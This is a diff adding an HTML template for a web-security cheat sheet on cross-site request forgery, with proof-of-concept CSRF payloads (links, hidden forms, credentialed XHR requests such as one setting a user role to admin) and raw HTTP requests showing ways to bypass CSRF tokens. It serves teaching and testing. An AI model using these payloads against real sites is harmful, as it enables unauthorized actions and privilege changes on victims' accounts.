@@ -1,0 +1,261 @@
+{% extends 'base.html' %}
+{% block body %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross Site Request Forgery (CSRF)</title>
+    <style>
+body, h1, h2, p, ol, li, pre, code {
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    line-height: 1.6;
+}
+
+article {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+h1 {
+    font-size: 2em;
+    margin-bottom: 20px;
+}
+
+h2 {
+    font-size: 1.5em;
+    margin-top: 20px;
+    margin-bottom: 10px;
+}
+
+section {
+    margin-bottom: 20px;
+}
+
+pre {
+    background-color: #f8f8f8;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+}
+
+code {
+    font-family: Consolas, monospace;
+}
+
+/* Style Markdown code blocks */
+pre code {
+    display: block;
+    padding: 10px;
+    background-color: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    overflow-x: auto;
+}
+
+    </style>
+</head>
+<body>
+<h1>Cross Site Request Forgery (CSRF)</h1>
+
+<h2>Introduction</h2>
+<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated</p>
+
+<h2>Where to find</h2>
+<p>Usually found in forms. Try submit the form and check the HTTP request. If the HTTP request does not have a CSRF token then it is likely to be vulnerable to a CSRF attack.</p>
+
+<h2>How to exploit</h2>
+<ol>
+    <li>
+        <p>HTML GET Method</p>
+        <pre><code>&lt;a href="http://www.example.com/api/setusername?username=uname"&gt;Click Me&lt;/a&gt;</code></pre>
+    </li>
+    <li>
+        <p>HTML POST Method</p>
+        <pre><code>&lt;form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&gt;
+&lt;input name="username" type="hidden" value="uname" /&gt;
+&lt;input type="submit" value="Submit Request" /&gt;
+&lt;/form&gt;</code></pre>
+    </li>
+    <li>
+        <p>JSON GET Method</p>
+        <pre><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.send();
+&lt;/script&gt;</code></pre>
+    </li>
+    <li>
+        <p>JSON POST Method</p>
+        <pre><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"role":admin}');
+&lt;/script&gt;</code></pre>
+    </li>
+    <li>
+        <p>Multipart request</p>
+        <pre><code>&lt;head&gt;
+&lt;title&gt;Multipart CSRF PoC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;br&gt;
+&lt;hr&gt;
+&lt;h2&gt;Click Submit request&lt;/h2&gt;&lt;br&gt;
+&lt;script&gt;
+  function submitRequest()
+  {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://example/api/users", true);
+    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+    xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------149631704917378");
+    xhr.withCredentials = true;
+    var body = "-----------------------------149631704917378\r\n" + 
+      "Content-Disposition: form-data; name=\"action\"\r\n" + 
+      "\r\n" + 
+      "update\r\n" + 
+      "-----------------------------149631704917378\r\n" + 
+      "Content-Disposition: form-data; name=\"user_id\"\r\n" + 
+      "\r\n" + 
+      "1\r\n" + 
+      "-----------------------------149631704917378\r\n" + 
+      "Content-Disposition: form-data; name=\"uname\"\r\n" + 
+      "\r\n" + 
+      "daffainfo\r\n" + 
+      "-----------------------------149631704917378\r\n" + 
+      "Content-Disposition: form-data; name=\"first_name\"\r\n" + 
+      "\r\n" + 
+      "m\r\n" + 
+      "-----------------------------149631704917378\r\n" + 
+      "Content-Disposition: form-data; name=\"last_name\"\r\n" + 
+      "\r\n" + 
+      "daffa\r\n" + 
+      "-----------------------------149631704917378--\r\n";
+    var aBody = new Uint8Array(body.length);
+    for (var i = 0; i &lt; aBody.length; i++)
+      aBody[i] = body.charCodeAt(i); 
+    xhr.send(new Blob([aBody]));
+  }
+&lt;/script&gt;
+&lt;form action="#"&gt;
+  &lt;input type="button" value="Submit request" onclick="submitRequest();" /&gt;
+&lt;/form&gt;
+&lt;br&gt;
+&lt;/body&gt;</code></pre>
+    </li>
+</ol>
+
+<h2>Bypass CSRF Token</h2>
+<p>But in some cases, even though there is a CSRF token on the form on the website. CSRF tokens can still be bypassed by doing a few things:</p>
+<ol>
+    <li>
+        <p>Change single character</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+        <p>Try this to bypass</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab</code></pre>
+    </li>
+    <li>
+        <p>Sending empty value of token</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+        <p>Try this to bypass</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=</code></pre>
+    </li>
+    <li>
+        <p>Replace the token with same length</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaaaaa</code></pre>
+        <p>Try this to bypass</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaabaa</code></pre>
+    </li>
+    <li>
+        <p>Changing POST / GET method</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+        <p>Try this to bypass</p>
+        <pre><code>GET /register?username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
+Host: target.com
+...</code></pre>
+    </li>
+    <li>
+        <p>Remove the token from request</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+        <p>Try this to bypass</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456</code></pre>
+    </li>
+    <li>
+        <p>Use another user's valid token</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=ANOTHER_VALID_TOKEN</code></pre>
+    </li>
+    <li>
+        <p>Try to decrypt hash</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=MTIzNDU2</code></pre>
+        <p>MTIzNDU2 =&gt; 123456 with base64</p>
+    </li>
+    <li>
+        <p>Sometimes anti-CSRF token is composed by 2 parts, one of them remains static while the others one dynamic</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=vi802jg9f8akd9j123</code></pre>
+        <p>When we register again, the request like this</p>
+        <pre><code>POST /register HTTP/1.1
+Host: target.com
+...
+
+username=dapos&password=123456&token=vi802jg9f8akd9j124</code></pre>
+        <p>If you notice "vi802jg9f8akd9j" part of the token remain same, you just need to send with only static part</p>
+    </li>
+</ol>
+</body>
+{% endblock %}
